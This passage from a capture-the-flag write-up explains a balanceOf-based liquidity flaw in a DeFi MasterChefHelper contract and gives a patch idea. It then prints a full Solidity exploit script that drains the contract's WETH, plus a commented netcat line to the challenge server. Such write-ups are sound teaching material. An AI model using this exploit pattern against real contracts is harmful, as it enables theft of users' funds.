+</span></span></code></pre></td></tr></table></div></div><p>So this function swap our <strong>tokenIn</strong> (for example <code>USDC</code> <strong>to</strong> <code>token0</code> & <code>token1</code> of the Liquidity Pool given into <code>poolId</code>).</p><p>Then will make a Liquidity Pool Token (LP) from <code>token1</code> and <code>token0</code> and sending back to <code>msg.sender</code>.</p><p>This is really similar to the <code>Zap</code> method from StellaSwap on Moonbeam 😎</p><p><figure><a class=lightgallery href=/posts/paradigmctf-/Untitled.png title=Untitled data-thumbnail=/posts/paradigmctf-/Untitled.png data-sub-html="<h2>Zap feature (from Stellaswap a DeFi Protocol).</h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/paradigmctf-/Untitled.png data-srcset="/posts/paradigmctf-/Untitled.png, /posts/paradigmctf-/Untitled.png 1.5x, /posts/paradigmctf-/Untitled.png 2x" data-sizes=auto alt=/posts/paradigmctf-/Untitled.png width=1206 height=1154></a><figcaption class=image-caption>Zap feature (from Stellaswap a DeFi Protocol).</figcaption></figure></p><p>But in our CTF, we cannot <strong>swap identical tokens</strong> (for example, if <code>tokenIn</code> is <code>USDC</code> the pool has to be something that doesn’t contain any USDC inside otherwise the <code>_swap(tokenIn, tokenOut1, amountIn / 2);</code> will revert with the message <code>IDENTICAL SWAP TOKEN</code>.</p><p>So this pool will work DAI/WETH but USDC/WETH will revert.</p><p>So now we understood that, our attack goal will be to trigger <code>_addLiquidity(tokenOut0, tokenOut1, minAmountOut);</code> with <code>token0</code> <em>DAI</em> and <code>token1</code> <em>WETH</em> to get the 10 <em>WETH</em> inside the contract.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=kd>function</span> <span class=nf>_addLiquidity</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=n>token0</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=n>token1</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=n>minAmountOut</span>
+</span></span><span class=line><span class=cl>  <span class=p>)</span> <span class=k>internal</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=p>(,</span> <span class=p>,</span> <span class=kt>uint256</span> <span class=n>amountOut</span><span class=p>)</span> <span class=o>=</span> <span class=n>router</span><span class=p>.</span><span class=n>addLiquidity</span><span class=p>(</span><span class=n>token0</span><span class=p>,</span> <span class=n>token1</span><span class=p>,</span> <span class=n>ERC20Like</span><span class=p>(</span><span class=n>token0</span><span class=p>).</span><span class=n>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>)),</span> <span class=n>ERC20Like</span><span class=p>(</span><span class=n>token1</span><span class=p>).</span><span class=n>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>)),</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=n>amountOut</span> <span class=o>&gt;=</span> <span class=n>minAmountOut</span><span class=p>,</span> <span class=s>&#39;minAmoun to slow&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>The vulnerability is here because the <code>MasterChefHelper</code> is using <code>ERC20Like(token1).balanceOf(address(this))</code> & <code>ERC20Like(token0).balanceOf(address(this))</code>.</p><blockquote><p>A <strong>check</strong> on the <code>swap</code> return value should be implemented here!</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>//Eexplanation code
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>uint256</span> <span class=n>realvalue0</span> <span class=o>=</span> <span class=n>_swap</span><span class=p>(</span><span class=n>tokenIn</span><span class=p>,</span> <span class=n>tokenOut0</span><span class=p>,</span> <span class=n>amountIn</span> <span class=o>/</span> <span class=mi>2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=kt>uint256</span> <span class=n>realvalue1</span> <span class=o>=</span> <span class=n>_swap</span><span class=p>(</span><span class=n>tokenIn</span><span class=p>,</span> <span class=n>tokenOut1</span><span class=p>,</span> <span class=n>amountIn</span> <span class=o>/</span> <span class=mi>2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// DO NOT USE IN PROD
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(,</span> <span class=p>,</span> <span class=kt>uint256</span> <span class=n>amountOut</span><span class=p>)</span> <span class=o>=</span> <span class=n>router</span><span class=p>.</span><span class=n>addLiquidity</span><span class=p>(</span><span class=n>token0</span><span class=p>,</span> <span class=n>token1</span><span class=p>,</span>
+</span></span><span class=line><span class=cl><span class=n>ERC20Like</span><span class=p>(</span><span class=n>token0</span><span class=p>).</span><span class=n>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>)),</span> 
+</span></span><span class=line><span class=cl><span class=n>ERC20Like</span><span class=p>(</span><span class=n>token1</span><span class=p>).</span><span class=n>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>)),</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// Patch version
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(,</span> <span class=p>,</span> <span class=kt>uint256</span> <span class=n>amountOut</span><span class=p>)</span> <span class=o>=</span> <span class=n>router</span><span class=p>.</span><span class=n>addLiquidity</span><span class=p>(</span><span class=n>token0</span><span class=p>,</span> <span class=n>token1</span><span class=p>,</span>
+</span></span><span class=line><span class=cl><span class=n>realvalue0</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl><span class=n>realvalue1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>Using <code>BalanceOf(address(this))</code>is dangerous here because if you have enough <code>token0</code> or <code>token1</code> then the pool will be created and sent back the <code>msg.sender</code>.</p><p>Now, we know that we have to swap some <em>WETH</em> to <em>USDC</em> and find a pool that doesn’t contain <em>USDC</em> inside but <em>WETH</em> is <strong>mandatory</strong> (as we said before we will choose <strong>DAI/WETH</strong>).</p><p>Perfect! the pool number <code>2</code> match exactly what we need :</p><p><figure><a class=lightgallery href=/posts/paradigmctf-/Untitled%201.png title=Untitled data-thumbnail=/posts/paradigmctf-/Untitled%201.png data-sub-html="<h2>Etherscan PoolInfo DAI/WETH address</h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/paradigmctf-/Untitled%201.png data-srcset="/posts/paradigmctf-/Untitled%201.png, /posts/paradigmctf-/Untitled%201.png 1.5x, /posts/paradigmctf-/Untitled%201.png 2x" data-sizes=auto alt=/posts/paradigmctf-/Untitled%201.png width=1976 height=716></a><figcaption class=image-caption>Etherscan PoolInfo DAI/WETH address</figcaption></figure></p><p>If we just call the <code>swapTokenForPoolToken()</code> with some <code>USDC</code> it will just create a “normal” LP with USDC/2 ⇒ <code>token0</code> & USDC/2 ⇒ <code>token1</code>. And you cannot withdraw the 10 <em>WETH</em>.</p><p>But the trick here is to send more <em>DAI</em> to <code>MasterChefHelper</code> directly.</p><p>So as we said last time <code>MasterChefHelper</code> will use <code>ERC20Like(token0).balanceOf(address(this))</code> and create a pool with the total value and sending back to you 😉</p><p>Then the pool will be empty! We then just has to flag the challenge using <code>netcat</code>!</p><p><figure><a class=lightgallery href=/posts/paradigmctf-/Untitled%202.png title=Untitled data-thumbnail=/posts/paradigmctf-/Untitled%202.png data-sub-html="<h2>Using netcat to get the flag!</h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/paradigmctf-/Untitled%202.png data-srcset="/posts/paradigmctf-/Untitled%202.png, /posts/paradigmctf-/Untitled%202.png 1.5x, /posts/paradigmctf-/Untitled%202.png 2x" data-sizes=auto alt=/posts/paradigmctf-/Untitled%202.png width=4098 height=742></a><figcaption class=image-caption>Using netcat to get the flag!</figcaption></figure></p><h3 id=socials--payload>Socials & Payload</h3><table><thead><tr><th>Discord (Join us!)</th><th>Github</th><th>Twitter</th></tr></thead><tbody><tr><td><a href=https://discord.gg/54Q9pnpQcV target=_blank rel="noopener noreffer">https://discord.gg/54Q9pnpQcV</a></td><td><a href=https://github.com/Ethnical/Swek3 target=_blank rel="noopener noreffer">https://github.com/Ethnical/Swek3</a></td><td><a href=https://twitter.com/EthnicalInfo target=_blank rel="noopener noreffer">https://twitter.com/EthnicalInfo</a></td></tr></tbody></table><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>// SPDX-License-Identifier: UNLICENSED
+</span></span><span class=line><span class=cl>pragma solidity ^0.8.13;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>//import &#39;forge-std/Script.sol&#39;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>import &#39;src/Setup.sol&#39;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>//import &#39;forge-std/Test.sol&#39;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>contract ContractScript {
+</span></span><span class=line><span class=cl>  function setUp() public {}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  function run() public payable {
+</span></span><span class=line><span class=cl>    Setup s = Setup(0x8ceB77a963474dbA300421fc8E8F91831C776dC3);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    MasterChefHelper M = s.mcHelper();
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    MasterChefLike ML = M.masterchef();
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    WETH9 wet = s.weth();
+</span></span><span class=line><span class=cl>    uint256 max = type(uint256).max;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    //echo &#34;1\nd85d44b338644cda1cbad7a66918f61ca5356c9f589be69b2a62eb\n&#34; | nc 34.123.187.206 31337
+</span></span><span class=line><span class=cl>    //vm.deal(address(this), 5000 ether);
+</span></span><span class=line><span class=cl>    //vm.addr(0xb746dd73a823761682724bcf5f06360680943e14a2e2a212c111c2a0dd469090);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    wet.deposit{value: 1000 ether}();
+</span></span><span class=line><span class=cl>    address dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+</span></span><span class=line><span class=cl>    address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+</span></span><span class=line><span class=cl>    address[] memory path = new address[](2);
+</span></span><span class=line><span class=cl>    path[0] = address(wet);
+</span></span><span class=line><span class=cl>    path[1] = address(dai);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    address[] memory path2 = new address[](2);
+</span></span><span class=line><span class=cl>    path2[0] = address(wet);
+</span></span><span class=line><span class=cl>    path2[1] = address(usdc);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    wet.approve(address(M.router()), 10000 ether); //Approve router
+</span></span><span class=line><span class=cl>    //wet.approve(0xC3D03e4F041Fd4cD388c549Ee2A29a9E5075882f, 10000 ether); //approve pool
+</span></span><span class=line><span class=cl>    ERC20Like(dai).approve(address(M), 100000000000 ether);
+</span></span><span class=line><span class=cl>    ERC20Like(usdc).approve(address(M), 100000000000 ether);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    M.router().swapExactTokensForTokens(500 ether, 100_000 ether, path, address(this), 10 ether); //Swap WETH TO DAI
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    M.router().swapExactTokensForTokens(500 ether, 100_000 * 10**6, path2, address(this), 10 ether); //Swap WETH TO DAI
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    M.swapTokenForPoolToken(2, address(usdc), 10_000 * 10**6, 10 ether);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    ERC20Like(dai).transfer(address(M), 35_000 ether);
+</span></span><span class=line><span class=cl>    M.swapTokenForPoolToken(2, address(usdc), 100, 100);
+</span></span><span class=line><span class=cl>    //M.swapTokenForPoolToken(2, address(usdc), 100, 100);
+</span></span><span class=line><span class=cl>    //M.swapTokenForPoolToken(2, address(usdc), 100, 100);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    //M.swapTokenForPoolToken(0, address(usdc), 1, 1 * 10**6);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    //M.router().swapExactTokensForTokens(500 ether, 1 ether, path2, address(this), max); //Swap WETH TO USDC
+</span></span><span class=line><span class=cl>  }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  fallback() external payable {}
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2022-12-30</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/ctf/>CTF</a>,&nbsp;<a href=/tags/defi/>DEFI</a>,&nbsp;<a href=/tags/uniswap/>UNISWAP</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/hacktm-dragon-slayer/ class=next rel=next title="HackTM - Dragon Slayer">HackTM - Dragon Slayer<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.111.3">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank></a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/lightgallery/css/lightgallery-bundle.min.css><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:500},comment:{},lightgallery:!0,search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
